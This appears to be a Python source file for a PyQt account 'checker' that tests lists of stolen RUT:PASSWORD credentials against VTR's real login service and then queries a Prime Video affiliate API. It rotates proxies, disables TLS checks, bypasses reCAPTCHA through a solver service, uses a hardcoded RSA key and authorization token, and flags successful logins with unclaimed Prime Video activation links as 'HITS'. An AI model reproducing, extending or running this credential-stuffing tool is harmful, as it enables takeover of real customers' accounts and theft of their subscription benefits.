import requests
import json
import base64
import re
from datetime import datetime
from PyQt5.QtCore import QObject, pyqtSignal
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend

class CheckerWorker(QObject):
    """Worker para verificación de cuentas VTR y Prime Video"""
    
    log_signal = pyqtSignal(str)
    result_signal = pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.session = requests.Session()
        self.timeout = 15
        self.rsa_public_key = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANgDJ1D8IOc8ZQpzJCnLujRc9Dt06ckrr1F8zTivMgAmFXlUv6Skbey+DZ4nZ/SAQgTFLpMm9i1/2BNabqFa5vsCAwEAAQ=="
        self.captcha_sitekey = "6Ldz5XEaAAAAAHyzCrh1TK53A22e-FSx0ukqyhmS"
        self.captcha_solver_url = "http://localhost:407/token"
        
    def log(self, message):
        """Emite mensaje de log"""
        self.log_signal.emit(message)
    
    def validate_rut(self, rut_str):
        """
        Valida RUT chileno y retorna formato estándar
        Retorna: (válido: bool, rut_formateado: str)
        """
        try:
            # Limpiar formato
            rut_clean = rut_str.replace(".", "").replace("-", "").upper()
            
            if len(rut_clean) < 2:
                return False, None
            
            # Separar número y dígito verificador
            rut_num = rut_clean[:-1]
            dv_ingresado = rut_clean[-1]
            
            # Validar que sean números
            if not rut_num.isdigit():
                return False, None
            
            # Validar DV
            if not (dv_ingresado.isdigit() or dv_ingresado == 'K'):
                return False, None
            
            # Calcular DV correcto
            dv_calculado = self._calcular_dv(rut_num)
            
            if dv_ingresado != dv_calculado:
                return False, None
            
            # Formatear RUT
            rut_formateado = f"{rut_num}-{dv_ingresado}"
            return True, rut_formateado
        
        except Exception as e:
            self.log(f"✗ Error validando RUT: {str(e)}")
            return False, None
    
    def _calcular_dv(self, rut_num):
        """Calcula dígito verificador de RUT"""
        try:
            multiplicadores = [2, 3, 4, 5, 6, 7]
            suma = 0
            
            for i, digito in enumerate(reversed(rut_num)):
                multiplicador = multiplicadores[i % len(multiplicadores)]
                suma += int(digito) * multiplicador
            
            resto = suma % 11
            dv = 11 - resto
            
            if dv == 11:
                return '0'
            elif dv == 10:
                return 'K'
            else:
                return str(dv)
        
        except Exception as e:
            self.log(f"✗ Error calculando DV: {str(e)}")
            return None
    
    def encrypt_password(self, password):
        """Encripta contraseña con RSA"""
        try:
            # Decodificar clave pública
            public_key_der = base64.b64decode(self.rsa_public_key)
            public_key = serialization.load_der_public_key(
                public_key_der,
                backend=default_backend()
            )
            
            # Encriptar
            encrypted = public_key.encrypt(
                password.encode(),
                padding.PKCS1v15()
            )
            
            # Codificar a Base64
            encrypted_b64 = base64.b64encode(encrypted).decode()
            return encrypted_b64
        
        except Exception as e:
            self.log(f"✗ Error encriptando contraseña: {str(e)}")
            return None
    
    def solve_captcha(self):
        """Resuelve CAPTCHA usando servidor local"""
        try:
            self.log("🤖 Resolviendo CAPTCHA...")
            
            data = {
                "url": "https://accounts.vtr.com",
                "sitekey": self.captcha_sitekey
            }
            
            response = requests.post(
                self.captcha_solver_url,
                json=data,
                timeout=150
            )
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    token = result.get('token')
                    self.log("✓ CAPTCHA resuelto")
                    return token
            
            self.log("✗ Error resolviendo CAPTCHA")
            return None
        
        except requests.exceptions.Timeout:
            self.log("✗ Timeout resolviendo CAPTCHA (timeout: 150s)")
            return None
        except Exception as e:
            self.log(f"✗ Error CAPTCHA: {str(e)}")
            return None
    
    def check_vtr(self, combo, proxy=None):
        """
        Verifica combo VTR:PASSWORD
        Retorna dict con resultado
        """
        try:
            # Parsear combo
            if ':' not in combo:
                return {
                    'status': 'BAD',
                    'rut': combo,
                    'captura': 'Formato inválido (esperado RUT:PASSWORD)'
                }
            
            rut_raw, password = combo.split(':', 1)
            
            # Validar RUT
            valido, rut_formateado = self.validate_rut(rut_raw)
            if not valido:
                return {
                    'status': 'BAD',
                    'rut': rut_raw,
                    'captura': 'RUT inválido'
                }
            
            rut_sin_dv = rut_formateado.split('-')[0]
            
            self.log(f"▶ Verificando: {rut_formateado}")
            
            # Configurar proxy
            proxies = None
            if proxy:
                proxies = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}'
                }
            
            # 1. GET inicial
            self.log("  ├─ Conectando a VTR...")
            try:
                url_login = "https://accounts.vtr.com/v2/auth/vtr/login.html"
                r1 = requests.get(
                    url_login,
                    params={'idp': 'vtr2'},
                    headers={'User-Agent': 'Mozilla/5.0'},
                    timeout=self.timeout,
                    proxies=proxies,
                    verify=False
                )
            except Exception as e:
                return {
                    'status': 'BAD',
                    'rut': rut_formateado,
                    'captura': f'Error conexión: {str(e)}'
                }
            
            # Extraer sessionDataKey
            session_match = re.search(r'sessionDataKey["\']?\s*[:=]\s*["\']([^"\']+ )', r1.text)
            if not session_match:
                return {
                    'status': 'BAD',
                    'rut': rut_formateado,
                    'captura': 'No se encontró sessionDataKey'
                }
            
            session_data_key = session_match.group(1)
            
            # 2. Resolver CAPTCHA
            captcha_token = self.solve_captcha()
            if not captcha_token:
                return {
                    'status': 'BAD',
                    'rut': rut_formateado,
                    'captura': 'Error resolviendo CAPTCHA'
                }
            
            # 3. Encriptar contraseña
            password_encriptada = self.encrypt_password(password)
            if not password_encriptada:
                return {
                    'status': 'BAD',
                    'rut': rut_formateado,
                    'captura': 'Error encriptando contraseña'
                }
            
            # 4. POST de autenticación
            self.log("  ├─ Enviando autenticación...")
            try:
                url_auth = "https://accounts.vtr.com/commonauth"
                data = {
                    'name': rut_sin_dv,
                    'username': rut_formateado,
                    'password': password_encriptada,
                    'g-recaptcha-response': captcha_token,
                    'sessionDataKey': session_data_key
                }
                
                r2 = requests.post(
                    url_auth,
                    data=data,
                    headers={'User-Agent': 'Mozilla/5.0'},
                    timeout=self.timeout,
                    proxies=proxies,
                    verify=False,
                    allow_redirects=False
                )
            except Exception as e:
                return {
                    'status': 'BAD',
                    'rut': rut_formateado,
                    'captura': f'Error autenticación: {str(e)}'
                }
            
            # Validar respuesta
            if "login.fail.message" in r2.text or r2.status_code == 401:
                return {
                    'status': 'BAD',
                    'rut': rut_formateado,
                    'captura': 'Credenciales inválidas'
                }
            
            # 5. Verificar Prime Video
            self.log("  ├─ Verificando Prime Video...")
            try:
                url_prime = "https://affiliates-api.tbxapis.com/v1/partnergw/affiliates/subscriptions"
                headers_prime = {
                    'Accept': 'application/json',
                    'Authorization': 'vtr-a11c019950-f84338973c',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                r3 = requests.get(
                    url_prime,
                    headers=headers_prime,
                    cookies=r2.cookies,
                    timeout=self.timeout,
                    proxies=proxies,
                    verify=False
                )
                
                if r3.status_code != 200:
                    return {
                        'status': 'BAD',
                        'rut': rut_formateado,
                        'captura': f'Error API Prime: {r3.status_code}'
                    }
                
                result = r3.json()
                
                # Procesar respuesta
                if isinstance(result, list) and len(result) > 0:
                    subscription = result[0]
                    status = subscription.get('status', 'UNKNOWN')
                    
                    if status == 'BINDING_PENDING':
                        return {
                            'status': 'HITS',
                            'rut': rut_formateado,
                            'captura': 'Prime Video disponible (Pendiente activación)',
                            'link': subscription.get('activationUrl')
                        }
                    elif status == 'BOUND':
                        return {
                            'status': 'CUSTOM',
                            'rut': rut_formateado,
                            'captura': 'Prime Video activado'
                        }
                    else:
                        return {
                            'status': 'CUSTOM',
                            'rut': rut_formateado,
                            'captura': f'Estado: {status}'
                        }
                else:
                    return {
                        'status': 'CUSTOM',
                        'rut': rut_formateado,
                        'captura': 'Sin beneficios Prime'
                    }
            
            except json.JSONDecodeError:
                return {
                    'status': 'CUSTOM',
                    'rut': rut_formateado,
                    'captura': 'Respuesta inválida de API'
                }
            except Exception as e:
                return {
                    'status': 'BAD',
                    'rut': rut_formateado,
                    'captura': f'Error Prime: {str(e)}'
                }
        
        except Exception as e:
            return {
                'status': 'BAD',
                'rut': combo.split(':')[0] if ':' in combo else combo,
                'captura': f'Error general: {str(e)}'
            }